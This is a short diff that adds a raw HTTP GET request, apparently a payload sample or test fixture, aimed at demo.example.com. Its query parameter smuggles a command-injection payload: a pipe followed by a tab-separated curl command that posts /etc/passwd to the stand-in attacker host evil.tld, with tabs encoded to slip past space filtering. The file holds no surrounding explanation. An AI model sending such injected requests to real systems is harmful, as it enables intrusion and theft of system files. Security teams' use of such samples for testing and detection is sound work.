@@ -1,0 +1,4 @@
+GET /a?path=|%09curl%09-d%09@/etc/passwd%09http://evil.tld HTTP/1.1
+Host: demo.example.com
+Connection: close
+
